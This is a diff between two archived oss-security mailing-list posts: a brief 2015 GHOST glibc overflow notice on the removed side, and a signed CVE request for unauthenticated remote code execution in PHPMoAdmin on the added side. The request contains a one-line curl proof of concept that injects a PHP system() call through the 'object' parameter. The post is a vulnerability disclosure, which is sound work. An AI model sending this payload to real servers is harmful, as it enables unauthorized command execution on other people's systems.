@@ -1,30 +1,41 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/27/4
-Message-ID: <20150127170458.10d6dced@pc>
-Date: Tue, 27 Jan 2015 17:04:58 +0100
-From: Hanno Böck <hanno@...eck.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/03/04/4
+Message-ID: <20150304073545.GA18617@kludge.henri.nerv.fi>
+Date: Wed, 4 Mar 2015 09:35:45 +0200
+From: Henri Salo <henri@...v.fi>
 To: oss-security@...ts.openwall.com
-Subject: GHOST gethostbyname() heap overflow in glibc (CVE-2015-0235)
+Cc: Pichaya Morimoto <pichaya@...e.org>
+Subject: CVE request: PHPMoAdmin Unauthorized Remote Code Execution
 Content-Type: text/plain; charset=utf-8
 
-There seems to be news out about a heap overflow in
-glibc's gethostbyname() function.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-The original is french which I don't understand, hackernews links
-google translate:
+Hello MITRE,
 
-https://translate.google.com/translate?hl=en&sl=fr&tl=en&u=http%3A%2F%2Fwww.frsag.org%2Fpipermail%2Ffrsag%2F2015-January%2F005722.html
+Can you assign 2015 CVE identifier for unauthorized remote code execution
+vulnerability in PHPMoAdmin <http://www.phpmoadmin.com/>, thanks.
 
-This is redhat's report:
-https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2015-0235
+curl "http://example.com/moadmin.php"; -d "object=1;system('id');exit"
 
-Origin seems to be a report from qualys.
+Original advisory: http://seclists.org/fulldisclosure/2015/Mar/19
 
--- 
-Hanno Böck
-http://hboeck.de/
+- -- 
+Henri Salo
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.12 (GNU/Linux)
 
-mail/jabber: hanno@...eck.de
-GPG: BBB51E42
-
-Content of type "application/pgp-signature" skipped
+iQIcBAEBAgAGBQJU9rXRAAoJECet96ROqnV0RAsP/RfOy2iFTxJKdfhQMQb+EXLZ
+IoznODmRYkOeXhyEtr2Fd4I2lX5QUiMNCCN+tyfucOu9oQ7c7L8ihwSYJxtUfseU
+nNoo+i3TKsUFqRQ7JOG4BgvPAMKhnUfisRC19Tz1WIrwRZiOl+EOpuiK3ll7zksB
+XSSmGJjYCI3//gFeeNJmNpOg3StUVuIxQPKe9krItNRPsJFnpnV/maYxfr6+62el
+HsX2eiGmYRIt4RY5YjSTYV06hmEiLv0LdhpH+AwxNopT1e58BY91le3v7Y/kkPl1
+UiOHBvo1Pc2u1dIVO2UMUUyAkMIt+2BFmcnf35L1IFtg4kxZ663uIGFXdP0O1oMA
+0BAvTYJNrDBWr6sIr0p4yLyq2YAOiUWuL88+sQN47eWRWfxlkIMYrAcWNZziYaiA
+32Sm6rAGSET62jLDwUcblGHslZEGyMtDGT+P15R1m8DiQRpShISW0HTj3tzjUqri
+5lHNMaZPRSwAxzmQrlAn7/GOM4TjPMSrzYmxGg01piuXvTxqA9tHzItS2cCkBLjq
+q5bD/qZ1JrZ6C8QHOHwkGwe2FVK0g3CeqWKhqV4e4JlfMoeQ8CbPcfjamJceHrUp
+/ihGZURp4ShdygRUJfSulfTD+YGftqgWfyR5Cp06Iae1hCqkrvvHaXPN1UDNAPaD
+gTB3J0Hu3Tub3LkiLvSb
+=lxia
+-----END PGP SIGNATURE-----
